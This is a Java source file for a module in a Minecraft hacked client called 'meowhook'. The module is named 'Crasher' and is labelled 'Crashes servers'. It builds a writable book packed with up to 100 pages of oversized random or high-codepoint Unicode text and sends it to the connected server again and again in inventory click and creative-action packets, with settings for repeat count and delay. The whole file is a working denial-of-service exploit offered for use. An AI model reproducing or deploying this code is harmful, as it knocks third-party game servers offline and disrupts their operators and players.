package meow.miyarishu.meowhook.features.modules.misc;

import meow.miyarishu.meowhook.features.command.Command;
import meow.miyarishu.meowhook.features.modules.Module;
import meow.miyarishu.meowhook.features.setting.Setting;
import meow.miyarishu.meowhook.util.Util;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.*;

import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

public class Crasher extends Module {

    public Crasher(){
        super("Crasher", "Crashes servers", Category.MISC, true, false, false);
    }

    private int currDelay;
    private Setting<Mode> mode = register(new Setting<Mode>("Mode", Mode.RAION));
    private Setting<FillMode> fillMode = register(new Setting<FillMode>("FillMode", FillMode.RANDOM));
    private Setting<Integer> uses = register(new Setting<Integer>("Uses", 5, 1, 10));
    private Setting<Integer> delay = register(new Setting<Integer>("Delay", 0, 0, 500));
    private Setting<Integer> pagesSettings = register(new Setting<Integer>("Pages", 50, 1, 500));
    private Setting<Boolean> autoToggle = register(new Setting<Boolean>("AutoToggle", true));

    @Override
    public void onUpdate() {
        if (Util.mc.getCurrentServerData() == null || Util.mc.getCurrentServerData().serverIP.isEmpty()) {
            Command.sendMessage("Not connected to a server");
            disable();
        }

        currDelay = (currDelay >= delay.getValue() ? 0 : delay.getValue() + 1);
        if (currDelay > 0) return;

        ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
        NBTTagList list = new NBTTagList();
        NBTTagCompound tag = new NBTTagCompound();
        String author = "Seggs";
        String title = "\n uwu owo awa :3 \n";

        String size = "";
        int pages = Math.min(pagesSettings.getValue(), 100);
        int pageChars = 210;

        if (fillMode.getValue().equals(FillMode.RANDOM)) {
            IntStream chars = new Random().ints(0x80, 0x10FFFF - 0x800).map(i -> i < 0xd800 ? i : i + 0x800);
            size = chars.limit(pageChars * pages).mapToObj(i -> String.valueOf((char) i)).collect(Collectors.joining());
        } else if (fillMode.getValue().equals(FillMode.FFFF)) {
            size = repeat(pages * pageChars, String.valueOf(0x10FFFF));
        } else if (fillMode.getValue().equals(FillMode.ASCII)) {
            IntStream chars = new Random().ints(0x20, 0x7E);
            size = chars.limit(pageChars * pages).mapToObj(i -> String.valueOf((char) i)).collect(Collectors.joining());
        } else if (fillMode.getValue().equals(FillMode.OLD)) {
            size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
        }

        for (int i = 0; i < pages; i++) {
            String siteContent = size;
            NBTTagString tString = new NBTTagString(siteContent);
            list.appendTag(tString);
        }

        tag.setString("author", author);
        tag.setString("title", title);
        tag.setTag("pages", list);

        bookObj.setTagInfo("pages", list);
        bookObj.setTagCompound(tag);

        for (int i = 0; i < uses.getValue(); i++) {
            Util.mc.playerController.connection.sendPacket(new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short) 0));
            if (mode.getValue() == Mode.JESSICA) {
                Util.mc.playerController.connection.sendPacket(new CPacketCreativeInventoryAction(0, bookObj));
            }
        }
    }

    private enum Mode {
        JESSICA, RAION
    }

    private enum FillMode {
        ASCII, FFFF, RANDOM, OLD
    }

    private static String repeat(int count, String with) {
        return new String(new char[count]).replace("\0", with);
    }


}
